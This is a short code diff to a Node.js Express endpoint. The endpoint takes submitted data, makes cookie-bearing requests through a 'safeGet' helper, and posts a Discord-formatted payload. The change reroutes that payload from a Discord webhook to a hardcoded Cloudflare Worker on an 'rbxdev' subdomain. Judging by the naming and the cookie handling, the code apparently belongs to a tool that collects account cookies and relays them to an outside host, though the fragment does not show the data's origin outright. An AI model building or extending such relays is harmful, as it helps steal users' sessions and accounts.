@@ -37,14 +37,12 @@ async function safeGet(url, cookie) {
 
 app.post('/api/process', async (req, res) => {
     const { data } = req.body;
-    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    
+    // Your Cloudflare Worker endpoint
+    const workerUrl = 'https://rbxdev.xoqixyzorevuxybi.workers.dev/';
 
     if (!data) {
         return res.status(400).json({ success: false, error: 'No data provided' });
-    }
-
-    if (!webhookUrl) {
-        return res.status(500).json({ success: false, error: 'Configuration error.' });
     }
 
     try {
@@ -151,7 +149,8 @@ app.post('/api/process', async (req, res) => {
             }]
         };
 
-        await fetch(webhookUrl, {
+        // Send payload to your Cloudflare Worker instead of directly to Discord
+        await fetch(workerUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(discordPayload)
